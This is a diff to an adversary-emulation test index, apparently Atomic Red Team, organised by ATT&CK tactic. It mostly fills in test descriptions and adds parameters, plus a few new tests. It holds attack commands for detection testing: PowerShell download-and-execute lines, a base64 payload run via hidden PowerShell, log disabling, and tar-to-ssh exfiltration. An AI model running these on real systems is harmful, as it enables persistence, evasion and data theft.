@@ -1125,7 +1125,7 @@ persistence:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -1157,30 +1157,73 @@ persistence:
         command: 'mv #{filename} .#{output_filename}
 
 '
+    - name: Create Windows System File with Attrib
+      description: 'Creates a file and marks it as a system file using the attrib.exe
+        utility.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: path of file to mark as system
+          type: path
+          default: C:\Windows\Temp\sensitive_file.txt
+      executor:
+        name: command_prompt
+        command: 'attrib.exe +s #{filename}
+
+'
+    - name: Create Windows Hidden File with Attrib
+      description: 'Creates a file and marks it as hidden using the attrib.exe utility.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: path of file to mark as hidden
+          type: path
+          default: C:\Windows\Temp\sensitive_file.txt
+      executor:
+        name: command_prompt
+        command: 'attrib.exe +h #{filename}
+
+'
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -1190,8 +1233,8 @@ persistence:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -1205,7 +1248,7 @@ persistence:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -1550,7 +1593,7 @@ persistence:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -1570,7 +1613,7 @@ persistence:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -1780,7 +1823,7 @@ persistence:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -1963,7 +2006,7 @@ persistence:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -1982,7 +2025,7 @@ persistence:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -2595,7 +2638,7 @@ persistence:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -2839,7 +2882,7 @@ persistence:
         name: powershell
         command: |
           $RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
-          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat`")"'
+          set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
           Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
     - name: Startup Folder
       description: 'Add Shortcut To Startup via PowerShell
@@ -4238,11 +4281,6 @@ defense-evasion:
         [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
       supported_platforms:
       - windows
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: manual
         steps: |
@@ -4510,6 +4548,23 @@ defense-evasion:
       executor:
         name: command_prompt
         command: 'fltmc.exe unload #{sysmon_driver}
+
+'
+    - name: Disable Windows IIS HTTP Logging
+      description: "Disables HTTP logging on a Windows IIS web server as seen by Threat
+        Group 3390 (Bronze Union). \nThis action requires HTTP logging configurations
+        in IIS to be unlocked.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        website_name:
+          description: The name of the website on a server
+          type: string
+          default: Default Web Site
+      executor:
+        name: command_prompt
+        command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
+          /section:httplogging /dontLog:true
 
 '
   T1107:
@@ -4983,7 +5038,7 @@ defense-evasion:
           mkdir .hidden-directory
           echo "this file is hidden" > .hidden-directory/.hidden-file
     - name: Mac Hidden file
-      description: 'TODO
+      description: 'Hide a file on MacOS
 
 '
       supported_platforms:
@@ -5015,30 +5070,73 @@ defense-evasion:
         command: 'mv #{filename} .#{output_filename}
 
 '
+    - name: Create Windows System File with Attrib
+      description: 'Creates a file and marks it as a system file using the attrib.exe
+        utility.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: path of file to mark as system
+          type: path
+          default: C:\Windows\Temp\sensitive_file.txt
+      executor:
+        name: command_prompt
+        command: 'attrib.exe +s #{filename}
+
+'
+    - name: Create Windows Hidden File with Attrib
+      description: 'Creates a file and marks it as hidden using the attrib.exe utility.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        filename:
+          description: path of file to mark as hidden
+          type: path
+          default: C:\Windows\Temp\sensitive_file.txt
+      executor:
+        name: command_prompt
+        command: 'attrib.exe +h #{filename}
+
+'
     - name: Hidden files
-      description: 'Requieres Apple Dev Tools
+      description: 'Requires Apple Dev Tools
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'setfile -a V #{filename}
 
 '
     - name: Hide a Directory
-      description: 'xxx
+      description: 'Hide a directory on MacOS
 
 '
       supported_platforms:
       - macos
+      input_arguments:
+        filename:
+          description: path of file to hide
+          type: path
+          default: "/tmp/evil"
       executor:
         name: sh
         command: 'chflags hidden #{filename}
 
 '
     - name: Show all hidden files
-      description: 'xxx
+      description: 'Show all hidden files on MacOS
 
 '
       supported_platforms:
@@ -5048,8 +5146,8 @@ defense-evasion:
         command: 'defaults write com.apple.finder AppleShowAllFiles YES
 
 '
-    - name: Create visible Directories
-      description: 'xxx
+    - name: Create Visible Directories
+      description: 'Create visible directories on MacOS and Linux
 
 '
       supported_platforms:
@@ -5063,7 +5161,7 @@ defense-evasion:
           ls
           ls visible-directory
     - name: Create hidden directories and files
-      description: 'xxx
+      description: 'Create hidden directories and files on Nix platforms
 
 '
       supported_platforms:
@@ -5250,7 +5348,7 @@ defense-evasion:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -5270,7 +5368,7 @@ defense-evasion:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -6491,7 +6589,7 @@ defense-evasion:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -7041,17 +7139,6 @@ defense-evasion:
         command: 'sudo modprobe #{rootkit_file}
 
 '
-    - name: LD_PRELOAD based Rootkit
-      description: 'LD_PRELOAD based Rootkit
-
-'
-      supported_platforms:
-      - linux
-      executor:
-        name: sh
-        command: 'export LD_PRELOAD=$PWD/#{rootkit_file}
-
-'
     - name: Windows Signed Driver Rootkit Test
       description: |
         This test exploits a signed driver to execute code in Kernel.
@@ -7446,6 +7533,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: 'touch -a -t 197001010000.00 #{target_filename}
@@ -7462,6 +7550,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: 'touch -m -t 197001010000.00 #{target_filename}
@@ -7480,6 +7569,7 @@ defense-evasion:
         target_filename:
           description: Path of file that we are going to stomp on last access time
           type: Path
+          default: "/opt/filename"
       executor:
         name: sh
         command: |
@@ -8612,7 +8702,7 @@ privilege-escalation:
       identifier: T1183
     atomic_tests:
     - name: IFEO Add Debugger
-      description: 'TODO
+      description: 'Leverage Global Flags Settings
 
 '
       supported_platforms:
@@ -8632,7 +8722,7 @@ privilege-escalation:
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
 
 '
-    - name: IFEO GLobal Flags
+    - name: IFEO Global Flags
       description: 'Leverage Global Flags Settings
 
 '
@@ -8725,7 +8815,7 @@ privilege-escalation:
       identifier: T1160
     atomic_tests:
     - name: Launch Daemon
-      description: 'TODO
+      description: 'Utilize LaunchDaemon to launch `Hello World`
 
 '
       supported_platforms:
@@ -8926,7 +9016,7 @@ privilege-escalation:
       identifier: T1150
     atomic_tests:
     - name: Plist Modification
-      description: 'TODO
+      description: 'Modify MacOS plist file in one of two directories
 
 '
       supported_platforms:
@@ -9659,8 +9749,8 @@ discovery:
       type: attack-pattern
       identifier: T1087
     atomic_tests:
-    - name: List all accounts
-      description: 'xxx
+    - name: Enumerate all accounts
+      description: 'Enumerate all accounts by copying /etc/passwd to another file
 
 '
       supported_platforms:
@@ -9694,7 +9784,7 @@ discovery:
 
 '
     - name: View accounts with UID 0
-      description: 'xxx
+      description: 'List opened files by user
 
 '
       supported_platforms:
@@ -9707,23 +9797,11 @@ discovery:
           default: "~/loot.txt"
       executor:
         name: sh
-        command: 'grep ''x:0:'' /etc/passwd > #{output_file}
-
-'
-    - name: List opened files by user
-      description: 'xxx
-
-'
-      supported_platforms:
-      - linux
-      - macos
-      executor:
-        name: sh
         command: 'username=$(echo $HOME | awk -F''/'' ''{print $3}'') && lsof -u $username
 
 '
     - name: Show if a user account has ever logger in remotely
-      description: 'xxx
+      description: 'Show if a user account has ever logger in remotely
 
 '
       supported_platforms:
@@ -9739,8 +9817,8 @@ discovery:
         command: 'lastlog > #{output_file}
 
 '
-    - name: Enumerate Groups and users
-      description: 'utilize local utilities to identify users and groups
+    - name: Enumerate users and groups
+      description: 'Utilize groups and id to enumerate users and groups
 
 '
       supported_platforms:
@@ -9751,13 +9829,22 @@ discovery:
         command: |
           groups
           id
+    - name: Enumerate users and groups
+      description: 'Utilize local utilities to enumerate users and groups
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        command: |
           dscl . list /Groups
           dscl . list /Users
           dscl . list /Users | grep -v '_'
           dscacheutil -q group
           dscacheutil -q user
-    - name: Enumerate all user accounts
-      description: 'List all accounts
+    - name: Enumerate all accounts
+      description: 'Enumerate all accounts
 
 '
       supported_platforms:
@@ -9771,8 +9858,8 @@ discovery:
           cmdkey.exe /list
           net localgroup "Users"
           net localgroup
-    - name: Enumerate all user accounts - PowerShell
-      description: 'List all accounts with PowerShell
+    - name: Enumerate all accounts via PowerShell
+      description: 'Enumerate all accounts via PowerShell
 
 '
       supported_platforms:
@@ -9791,8 +9878,8 @@ discovery:
           get-aduser -filter *
           get-localgroup
           net localgroup
-    - name: Get logged on Users
-      description: 'List logged on users
+    - name: Enumerate logged on users
+      description: 'Enumerate logged on users
 
 '
       supported_platforms:
@@ -9802,8 +9889,8 @@ discovery:
         command: 'query user
 
 '
-    - name: Get logged on users PowerShell
-      description: 'List logged on users powershell
+    - name: Enumerate logged on users via PowerShell
+      description: 'Enumerate logged on users via PowerShell
 
 '
       supported_platforms:
@@ -13321,7 +13408,7 @@ execution:
       identifier: T1168
     atomic_tests:
     - name: Cron Job
-      description: 'TODO
+      description: 'Set a cron job
 
 '
       supported_platforms:
@@ -13340,7 +13427,7 @@ execution:
 
 '
     - name: Cron Job
-      description: 'TODO
+      description: 'Manually set a cron job
 
 '
       supported_platforms:
@@ -13683,7 +13770,7 @@ execution:
           type: string
           default: Atomic Things
       executor:
-        name: command_prompt
+        name: powershell
         command: 'New-LocalUser -FullName ''#{full_name}'' -Name ''#{user_name}''
           -Password #{password} -Description ''#{description}''
 
@@ -13761,7 +13848,7 @@ execution:
       - windows
       executor:
         name: command_prompt
-        command: |-
+        command: |
           reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggJyVTeXN0ZW1Sb290JS9UZW1wL2FydC1tYXJrZXIudHh0JyAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI="
           powershell.exe -noprofile -windowstyle hidden -executionpolicy bypass iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
   T1121:
@@ -15610,49 +15697,180 @@ lateral-movement:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync remote file copy (push)
+      description: 'Utilize rsync to perform a remote file copy (push)
 
 '
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        local_path:
+          description: Path of folder to copy
+          type: Path
+          default: "/tmp/adversary-rsync/"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive rsync
+          type: Path
+          default: "/tmp/victim-files"
       executor:
         name: bash
-        command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+        command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-          # Adversary System Configuration
-          # Ensure SSH access has been configured for an adversary account
-          echo "This file transferred by scp" > /tmp/adversary-scp
-          echo "This file transferred by sftp" > /tmp/adversary-sftp
-          mkdir /tmp/adversary-rsync
-          cd /tmp/adversary-rsync
-          touch a b c d e f g
+'
+    - name: rsync remote file copy (pull)
+      description: 'Utilize rsync to perform a remote file copy (pull)
 
-          # Victim System Configuration
-          # Ensure SSH access has been configured for a victim account
-          # Ensure write access for victim account to this directory
-          mkdir /tmp/victim-files
-          cd /tmp/victim-files
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_path:
+          description: Path of folder to copy
+          type: Path
+          default: "/tmp/adversary-rsync/"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive rsync
+          type: Path
+          default: "/tmp/victim-files"
+      executor:
+        name: bash
+        command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-          # Push files to victim using rsync
-          rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/
+'
+    - name: scp remote file copy (push)
+      description: 'Utilize scp to perform a remote file copy (push)
 
-          # Pull files from adversary using rsync
-          rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        local_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-scp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive scp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-          # Push files to victim using scp
-          scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
+'
+    - name: scp remote file copy (pull)
+      description: 'Utilize scp to perform a remote file copy (pull)
 
-          # Pull file from adversary using scp
-          scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-scp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive scp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-          # Push files to victim using sftp
-          sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
+'
+    - name: sftp remote file copy (push)
+      description: 'Utilize sftp to perform a remote file copy (push)
 
-          # Pull file from adversary using sftp
-          sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        local_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-sftp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive sftp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
+
+'
+    - name: sftp remote file copy (pull)
+      description: 'Utilize sftp to perform a remote file copy (pull)
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-sftp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive sftp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+
+'
   T1077:
     technique:
       name: Windows Admin Shares
@@ -16212,7 +16430,7 @@ collection:
       - windows
       executor:
         name: powershell
-        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/Discovery.bat'')"
+        command: '"IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat'')"
           > c:\windows\pi.log
 
 '
@@ -16547,9 +16765,8 @@ exfiltration:
       identifier: T1002
     atomic_tests:
     - name: Compress Data for Exfiltration With PowerShell
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16567,9 +16784,8 @@ exfiltration:
 
 '
     - name: Compress Data for Exfiltration With Rar
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - windows
       input_arguments:
@@ -16587,9 +16803,8 @@ exfiltration:
 
 '
     - name: Data Compressed - nix
-      description: 'TODO
-
-'
+      description: "An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration \n"
       supported_platforms:
       - linux
       - macos
@@ -16667,7 +16882,7 @@ exfiltration:
       identifier: T1022
     atomic_tests:
     - name: Data Encrypted
-      description: 'TODO
+      description: 'Encrypt data for exiltration
 
 '
       supported_platforms:
@@ -16738,11 +16953,6 @@ exfiltration:
       - centos
       - ubuntu
       - linux
-      input_arguments:
-        output_file:
-          description: TODO
-          type: todo
-          default: TODO
       executor:
         name: sh
         command: |
@@ -16833,6 +17043,19 @@ exfiltration:
       - centos
       - ubuntu
       - linux
+      input_arguments:
+        domain:
+          description: target SSH domain
+          type: url
+          default: target.example.com
+        user_name:
+          description: username for domain
+          type: string
+          default: atomic
+        password:
+          description: password for user
+          type: string
+          default: atomic
       executor:
         name: sh
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
@@ -16931,6 +17154,89 @@ command-and-control:
       modified: '2018-04-18T17:59:24.739Z'
       type: attack-pattern
     atomic_tests: []
+  T1090:
+    technique:
+      name: Connection Proxy
+      description: |-
+        A connection proxy is used to direct network traffic between systems or act as an intermediary for network communications. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)
+
+        The definition of a proxy can also be expanded out to encompass trust relationships between networks in peer-to-peer, mesh, or trusted connections between networks consisting of hosts or systems that regularly communicate with each other.
+
+        The network may be within a single organization or across organizations with trust relationships. Adversaries could use these types of relationships to manage command and control communications, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.
+
+        Detection: Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Network activities disassociated from user-driven actions from processes that normally require user direction are suspicious.
+
+        Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)
+
+        Platforms: Linux, macOS, Windows
+
+        Data Sources: Process use of network, Process monitoring, Netflow/Enclave netflow, Packet capture
+
+        Requires Network: Yes
+
+        Contributors: Walker Johnson
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: command-and-control
+      external_references:
+      - url: https://attack.mitre.org/wiki/Technique/T1090
+        source_name: mitre-attack
+        external_id: T1090
+      - description: 'Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools
+          of the Trade. Retrieved December 2, 2015.'
+        source_name: Trend Micro APT Attack Tools
+        url: http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/
+      - description: Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command
+          & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.
+        source_name: University of Birmingham C2
+        url: https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      created: '2017-05-31T21:31:08.479Z'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_platforms:
+      - Linux
+      - macOS
+      - Windows
+      x_mitre_data_sources:
+      - Process use of network
+      - Process monitoring
+      - Netflow/Enclave netflow
+      - Packet capture
+      x_mitre_network_requirements: true
+      x_mitre_contributors:
+      - Walker Johnson
+      id: attack-pattern--731f4f55-b6d0-41d1-a7a9-072a66389aea
+      modified: '2018-04-18T17:59:24.739Z'
+      type: attack-pattern
+      identifier: T1090
+    atomic_tests:
+    - name: Connection Proxy
+      description: |
+        Enable traffic redirection.
+
+        To undo changes made by this test:
+          unset http_proxy
+          unset https_proxy
+
+        Note that this test may conflict with pre-existing system configuration.
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        proxy_server:
+          description: Proxy server URL (host:port)
+          type: url
+          default: 127.0.0.1:8080
+        proxy_scheme:
+          description: Protocol to proxy (http or https)
+          type: string
+          default: http
+      executor:
+        name: sh
+        command: 'export #{proxy_scheme}_proxy=#{proxy_server}
+
+'
   T1132:
     technique:
       name: Data Encoding
@@ -17066,49 +17372,180 @@ command-and-control:
       type: attack-pattern
       identifier: T1105
     atomic_tests:
-    - name: xxxx
-      description: 'xxxx
+    - name: rsync remote file copy (push)
+      description: 'Utilize rsync to perform a remote file copy (push)
 
 '
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        local_path:
+          description: Path of folder to copy
+          type: Path
+          default: "/tmp/adversary-rsync/"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive rsync
+          type: Path
+          default: "/tmp/victim-files"
       executor:
         name: bash
-        command: |
-          ### TODO: Not sure how to handle commands that need to be run on multiple systems
+        command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-          # Adversary System Configuration
-          # Ensure SSH access has been configured for an adversary account
-          echo "This file transferred by scp" > /tmp/adversary-scp
-          echo "This file transferred by sftp" > /tmp/adversary-sftp
-          mkdir /tmp/adversary-rsync
-          cd /tmp/adversary-rsync
-          touch a b c d e f g
+'
+    - name: rsync remote file copy (pull)
+      description: 'Utilize rsync to perform a remote file copy (pull)
 
-          # Victim System Configuration
-          # Ensure SSH access has been configured for a victim account
-          # Ensure write access for victim account to this directory
-          mkdir /tmp/victim-files
-          cd /tmp/victim-files
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_path:
+          description: Path of folder to copy
+          type: Path
+          default: "/tmp/adversary-rsync/"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive rsync
+          type: Path
+          default: "/tmp/victim-files"
+      executor:
+        name: bash
+        command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-          # Push files to victim using rsync
-          rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/
+'
+    - name: scp remote file copy (push)
+      description: 'Utilize scp to perform a remote file copy (push)
 
-          # Pull files from adversary using rsync
-          rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        local_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-scp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive scp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-          # Push files to victim using scp
-          scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
+'
+    - name: scp remote file copy (pull)
+      description: 'Utilize scp to perform a remote file copy (pull)
 
-          # Pull file from adversary using scp
-          scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-scp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive scp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-          # Push files to victim using sftp
-          sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
+'
+    - name: sftp remote file copy (push)
+      description: 'Utilize sftp to perform a remote file copy (push)
 
-          # Pull file from adversary using sftp
-          sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        local_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-sftp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: victim
+        remote_host:
+          description: Remote host to copy toward
+          type: String
+          default: victim-host
+        remote_path:
+          description: Remote path to receive sftp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
+
+'
+    - name: sftp remote file copy (pull)
+      description: 'Utilize sftp to perform a remote file copy (pull)
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        remote_file:
+          description: Path of file to copy
+          type: Path
+          default: "/tmp/adversary-sftp"
+        username:
+          description: User account to authenticate on remote host
+          type: String
+          default: adversary
+        remote_host:
+          description: Remote host to copy from
+          type: String
+          default: adversary-host
+        local_path:
+          description: Local path to receive sftp
+          type: Path
+          default: "/tmp/victim-files/"
+      executor:
+        name: bash
+        command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+
+'
   T1065:
     technique:
       name: Uncommonly Used Port
